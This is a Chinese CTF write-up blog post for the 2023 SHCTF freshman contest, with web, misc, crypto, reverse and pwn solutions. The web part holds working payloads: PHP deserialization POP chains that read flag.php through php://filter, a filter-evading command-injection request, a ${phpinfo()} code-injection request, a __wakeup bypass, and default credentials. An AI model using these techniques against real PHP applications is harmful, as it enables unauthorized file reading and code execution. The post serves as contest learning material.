# 2023SHCTF联赛


2023SHCTF联赛---工带第二届新生赛

<!--more-->

作为组委会摆烂成员，

摸鱼水题出题人，

自己也稍微做了点



更详细的wp见官方wp：

https://mp.weixin.qq.com/s/9Q176LuKQAhw7TlNg9vk4A

## WEB

### [WEEK1]1zzphp

套路跟ctfshow web131差不多

```
import requests
url="http://112.6.51.212:31610/?num[]=a"
data={
  'c_ode':'very'*250000+'2023SHCTF'
}
r=requests.post(url,data=data)
print(r.text)
```

### [WEEK1]ez_serialize

```
<?php
class A{
  public $var_1='php://filter/read=convert.base64-encode/resource=flag.php';
  public function _invoke(){
​    include($this->var_1);
  }
}
class B{
  public $q;
  public function _wakeup(){
​    $this->q=new A();
  }
}
class C
{
  public $var;
  public $z;
  public function _toString(){
  return $this->z= new D();
  }
}
class D{
  public $p;
  public function __get($key){
​    $function = $this->p = new A();
  }
}
$pop=new B();
$pop->q=new C();
$pop->q->z=new D();
$pop->q->z->p=new A();
echo urlencode(serialize($pop));
```

### [WEEK1]babyRCE

bp发包

```
GET /?rce=ca\t${IFS}/fla? HTTP/1.1
Host: 112.6.51.212:31105
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

### [WEEK1]登录就给flag

```
admin/password
```

### [WEEK1]飞机大战

右键查看源代码，查看JS代码

![image-20231125205406658](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205406658.png)

找到

![image-20231125205435707](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205435707.png)

解码得到flag

### [WEEK1]ezphp

```
POST /?code=?.*=${phpinfo()} HTTP/1.1
Host: 112.6.51.212:31240
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

pattern=.*

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps24.jpg)

### [WEEK2]serialize

```
<?php
class misca{
  public $gao;
  public $fei;
  public $a;
  public function __get($key){
    $this->miaomiao();
    $this->gao=$this->fei;
    die($this->a);
  }
  public function miaomiao(){
    $this->a='Mikey Mouse~';
  }
}
class musca {
  public $ding;
  public $dong;
  public function __wakeup(){
    return $this->ding->dong;
  }
}
class milaoshu{
  public $v;
  public function __tostring(){
    echo"misca~musca~milaoshu~~~";
    include($this->v);
  }
}
function check($data){
  if(preg_match('/^O:\d+/',$data)){
    die("you should think harder!");
  }
  else return $data;
}
$MI = new misca();
$MU = new musca();
$MIL = new milaoshu();
$MIL -> v = 'php://filter/read=convert.base64-encode/resource=flag.php';
$MI -> a =&$MI -> gao;
$MI -> gao ='1';
$MI -> fei =$MIL;
$MU -> ding = $MI;
$MU -> dong = 'Arcueid';
echo serialize(array($MU));
```

### [WEEK2]no_wake_up

```
<?php
class flag
{
  public $username = "admin";
  public $code = "php://filter/read=convert.base64-encode/resource=flag.php";
  public function _wakeup()
  {
​    $this->username = "admin";
  }
  public function __destruct()
  {
​    if ($this->username = "admin") {
​      include($this->code);
​    }
  }
}
$a= (serialize(new flag));
echo $a;
```

然后将payload中反序列化的成员数2改成比2大的数

```
GET /wakeup.php?try=O:4:"flag":3:{s:8:"username";s:5:"admin";s:4:"code";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";} HTTP/1.1
Host: 112.6.51.212:30930
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://112.6.51.212:30930/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps45.jpg) 

Base解码得到flag

### [WEEK2]EasyCMS

进入url/admin/admin.php

查到taoCMS登录弱口令admin/tao

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps46.jpg) 

随后在文件管理处找到flag位置

### [WEEK2]ez_ssti

（这个payload push不上去，只能上截图了）

![image-20231125211011103](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125211011103.png)



![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps47.jpg) 

 [WEEK1]生成你的邀请函吧~

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps41.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps42.jpg) 





## MISC

### [WEEK1] 真的签到

扫码回复

### [WEEK1]ez-misc

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps1.jpg) 

二进制转图片，扫码得到解压密码

然后

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps2.jpg) 

放到cyberchef里得到rockyou，使用rockyou字典进行爆破得到解压密码

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps3.jpg) 

得到
![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps4.jpg)

随后

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps5.jpg) 

### [WEEK1]残缺的md5

```
import hashlib
m='KCLWG?K8M9O3?DE?84S9'
for i in range(26):
  t1 = m.replace('?',str(chr(65+i)),1)
  for j in range(26):
​    t2 = t1.replace('?',str(chr(65+j)),1)
​    for h in range(26):
​      t3 = t2.replace('?',str(chr(65+h)),1)
​      s = hashlib.md5(t3.encode('utf8')).hexdigest().upper()
​      if s[:4] == 'F0AF':
​        print(s) 
```

### [WEEK1]message

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps8.jpg) 

### [WEEK1]佛说：只能四天

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps9.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps10.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps11.jpg) 

先栅栏4再rot3然后base16解码，出flag

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps12.jpg) 

### [WEEK1]迷雾重重

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps13.jpg) 

### [WEEK1]可爱的派蒙捏

 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps14.jpg) 

 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps15.jpg) 

### [WEEK1]请对我使用社工吧

图片上有QQ号，tg盒出是东营，知道中石大在东营有个校区，就出了

### [WEEK1]签到题

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps25.jpg) 

### [WEEK1]黑暗之歌

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps16.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps17.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps18.jpg) 

 [WEEK1]Jaeger lover

steghide extract -sf Typhoon.jpg

密码是：Tri-Sun Horizon Gate

随后拿到了解压密码：.*+#1Ao/aeS

随后

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps32.jpg)

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps33.jpg) 

K34-759183-191

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps34.jpg) 

### [WEEK1]Steganography

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps35.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps36.jpg)![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps37.jpg) 

将xqwed替换掉base64解出来12ercs.....909jk的点，得到解压密码，解压密码得到flag

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps38.jpg)

### [WEEK1]也许需要一些py

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps22.jpg) 

```
import hashlib
def reverse_case(s):
  \# 逐个反转字符串中的大小写字母
  result = []
  for i in range(2 ** len(s)):
​    new_str = ''
​    for j in range(len(s)):
​      if (i >> j) & 1:
​        new_str += s[j].lower()
​      else:
​        new_str += s[j].upper()
​    result.append(new_str)
  return result
def calculate_md5(s):
  \# 计算字符串的md5值
  md5_hash = hashlib.md5()
  md5_hash.update(s.encode('utf-8'))
  return md5_hash.hexdigest()
def main():
  input_str = "pNg_and_Md5_SO_GreaT"
  target_md5 = "63e62fbce22f2757f99eb7da179551d2"
  variations = reverse_case(input_str)
  for var in variations:
​    md5 = calculate_md5(var)
​    print(f"{var}, MD5: {md5}")
​    if md5 == target_md5:
​      print(f"找到匹配的结果: {var}")
​      break
if __name__ == "__main__":
  main()
```

### [WEEK1]电信诈骗

关键词，四行七列，vivo50

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps58.jpg) 

### [WEEK3]尓纬玛

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps59.jpg) 

还是有点问题的，，，，把左侧区纠错，得到flag

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps60.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps61.jpg) 

### [WEEK2]哈希猫

逐一解密应该能解出来，，，，懒得搓了

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps55.jpg) 

### [WEEK2]表里的码

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps56.jpg) 

加粗填充为黑色，不加粗不填充，扫码得到flag

### [WEEK2]可爱的洛琪希

首先，zip未加密

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps48.jpg) 

然后base64解码得到jpg图片，在图片的属性信息里面的到十六进制字符串，解码得到flag

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps49.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps50.jpg) 

维吉尼亚解密得到flag

###  [WEEK2]图片里的秘密

Binwalk得到另一张图

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps51.jpg) 

盲水印提取

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps52.jpg) 

###  [WEEK2]喜帖街

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps53.jpg) 

steghide extract -sf music.wav -p LeeTung

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps54.jpg) 

随后okk解码得到flag

### [WEEK2]远在天边近在眼前

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps43.jpg) 

}\4\a\9\2\b\0\a\5\7\c\e\f\_\_\T\H\G\l\R\I\a\_\y\5\4\e\_\Y\l\l\a\e\r\_\s\I\_\S\l\h\7\{\g\a\l\f

Windows下显示不全，可以在Linux下查看

### [WEEK2]奇怪的screenshot

根据文件描述和图片已知部分，可知为win的截图漏洞
https://github.com/frankthetank-music/Acropalypse-Multi-Tool?search=1利用工具修复得到完整图片，提取其中的文字进行百家姓解密得到flag

![image-20231125205039575](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205039575.png)

[在线百家姓暗号转换 - 2048T在线工具站](https://2048t.com/tools/bjx-format)

![image-20231125205220820](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205220820.png)

## CRYPTO

### [WEEK1]really_ez_rsa

```
import gmpy2
from Crypto.Util.number import long_to_bytes
p=217873395548207236847876059475581824463
q=185617189161086060278518214521453878483
c=6170206647205994850964798055359827998224330552323068751708721001188295410644
e=65537
n=p*q
d= gmpy2.invert(e,(p-1)*(q-1))
m = pow(c,d,n)
print(long_to_bytes(m))
```

### [WEEK1]凯撒大帝

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps26.jpg) 

 

### [WEEK1]进制

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps27.jpg) 

 

### [WEEK1]okk

https://www.splitbrain.org/services/ook

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps28.jpg) 

### [WEEK1]熊斐特

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps29.jpg) 

 

 

 

### [WEEK1]难言的遗憾

https://www.qqxiuzi.cn/bianma/dianbao.php

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps30.jpg) 

### [WEEK1]小兔子可爱捏

密码是42

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps31.jpg)

### [WEEK1]Crypto_Checkin

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps6.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps7.jpg) 

### [WEEK1]what is m

```
from Crypto.Util.number import bytes_to_long
from Crypto.Util.number import inverse,long_to_bytes
m = 7130439814057451252206961031070073581161360005074250134175813545291250484317873215316850120633657018292427636656594416171229024284761739178169667824242590880304270396813980988571810173170813
flag=long_to_bytes(m)
flag.decode()
print(flag)
```

### [WEEK1]立正

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps44.jpg) 

但，，，最后没解出来

## REVERSE

### [WEEK1]ez_apk

Jeb，base62换表

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps57.jpg) 

### [WEEK1]signin

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps23.jpg) 

###  [WEEK1]easy_re

Ida F5得到加密代码

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps39.jpg) 

跟进比对字符串

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps40.jpg) 

```
code = [0x66,0x0C6,0x16,0x76,0x0B7,0x45,0x27,0x97,0x0F5,0x47,0x3,0x0F5,0x37,0x3,0x0C6,0x67,0x33,0x0F5,0x47,0x86,0x56,0x0F5,0x26,0x96,0x0E6,0x16,0x27,0x97,0x0F5,0x7,0x27,0x3,0x26,0x0C6,0x33,0x0D6,0x0D7,0x1B]
flag=""
for i in code:
  decrypt = ((i<<4)&0xFF)|(i>>4)
  flag += chr(decrypt)
print(flag)
```

## PWN

### [WEEK1]hard nc

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps19.jpg) 

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps20.jpg) 

### [WEEK1]nc

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps21.jpg) 

